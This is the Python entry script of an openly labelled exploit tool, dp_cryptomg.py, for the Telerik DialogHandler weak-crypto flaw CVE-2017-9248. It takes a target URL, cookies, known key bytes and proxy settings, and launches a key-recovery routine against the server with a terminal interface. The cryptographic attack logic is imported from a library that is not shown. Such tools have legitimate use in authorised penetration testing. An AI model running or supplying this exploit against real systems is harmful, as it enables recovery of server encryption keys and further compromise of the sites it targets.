import sys
import time
import threading
from lib.dpcryptolib import *
from lib.terminalview import *
from lib.simpleterminalview import *
from argparse import ArgumentParser

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class multiThreadHandler:
    def __init__(self, CO):
        self.CO = CO
        self.lock = threading.Lock()

    def worker(self):
        self.do_work(CO)

    def do_work(self, CO):
        CO.findKey()

    def run(self):

        t = threading.Thread(target=self.worker)
        t.daemon = True
        t.start()
        return


def main_usage():

    print("dp_cryptomg.py v0.1.0")
    print("Telerik DialogHandler Weak Crypto Exploit (CVE-2017-9248)")
    print("@paulmmueller\n")
    print("Black Lantern Security - https://www.blacklanternsecurity.com/\n")


if __name__ == "__main__":

    parser = ArgumentParser(usage=main_usage())
    parser.add_argument("url", help="The target URL")
    #   parser.add_argument("-h", "--help", help="print the help screen and exit", required=False, action="store_true")
    parser.add_argument("-d", "--debug", help="Enable debugging mode", required=False, action="store_true")
    parser.add_argument("-c", "--cookie", help="Add optional cookie header to every request", required=False)
    parser.add_argument("-k", "--known-key", help="The partial or complete known key, in HEX format", required=False)
    parser.add_argument("-v", "--version", help="Specify the Telerik version, if known", required=False)
    parser.add_argument("-l", "--length", help="The length of the key, if known", required=False)
    parser.add_argument("-p", "--proxy", help="Optionally set an HTTP proxy", required=False)
    parser.add_argument("-s", "--simple", help="Turn on off the fancy interface", required=False, action="store_true")
    parser.add_argument(
        "-S",
        "--super-simple",
        help="Turn on off the fancy interface and show minimal output",
        required=False,
        action="store_true",
    )

    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    args, unknown = parser.parse_known_args()

    if "Telerik.Web.UI.DialogHandler.aspx" in args.url:
        handler = "DH"
    elif "Telerik.Web.UI.SpellCheckHandler.axd" in args.url:
        handler = "SP"
    else:
        print("Invalid URL")
        sys.exit()

    if args.cookie:
        cookie = args.cookie
    else:
        cookie = None

    debug = False
    if args.debug:
        debug = True

    if args.known_key:
        knownkey = bytes.fromhex(args.known_key)
    else:
        knownkey = b""

    if args.length:
        keylength = int(args.length)
    else:
        keylength = 48

    if args.version:
        version = args.version
    else:
        version = None

    if args.proxy:
        proxy = args.proxy
    else:
        proxy = None

    if args.simple:
        simple_mode = True
    else:
        simple_mode = False

    if args.super_simple:
        simple_mode = True
        super_simple_mode = True
    else:
        super_simple_mode = False

    if not simple_mode:
        terminal = TerminalView()
    else:
        terminal = SimpleTerminalView()

    CO = CryptOMG(
        debug=debug,
        url=args.url,
        handler=handler,
        cookie=cookie,
        knownkey=knownkey,
        version=version,
        length=keylength,
        proxy=proxy,
        terminal=terminal,
        mthlock=None,
    )
    terminal.cryptomg = CO

    if not simple_mode:
        mth = multiThreadHandler(CO)
        CO.mthlock = mth.lock
        terminal.t.init_window()
        with terminal.t.cbreak(), terminal.t.hidden_cursor():
            keypress = ""
            exit = False
            mth_started = False
            while exit == False:
                while keypress != "q":
                    if not mth_started:
                        mth.run()
                        mth_started = True
                    keypress = terminal.t.inkey(timeout=0)
                    terminal.initial_draw()
                    keypress = terminal.t.inkey(timeout=5)
                mth.CO.kill = True
                keypress = ""
                time.sleep(0.6)
                print(terminal.t.clear)
                print(
                    terminal.t.move_y(terminal.t.height // 2)
                    + terminal.t.center("Press 'q' to confirm exit. Press any other key to continue").rstrip()
                )
                val = terminal.t.inkey()
                if val.lower() == "q":
                    exit = True
            print(terminal.t.clear)
            print(terminal.t.move_y(terminal.t.height // 2) + terminal.t.center("Exiting...").rstrip())
            time.sleep(1)
            print(terminal.t.clear)
            terminal.cleanup()
            sys.exit()
    else:
        if super_simple_mode:
            terminal.super_simple = True
        terminal.initial_draw()
        CO.findKey()
